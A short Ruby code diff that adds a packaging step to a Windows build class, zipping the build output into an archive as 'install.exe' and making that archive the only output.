@@ -71,6 +71,18 @@ class BuildWindows < Build
     @outputs << 'output'
   end
 
+  def pack(params)
+    trace :debug, "Build: pack: #{params}"
+
+    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      z.file.open('install.exe', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+    end
+
+    # this is the only file we need to output after this point
+    @outputs = ['output.zip']
+
+  end
+
 end
 
 end #DB::
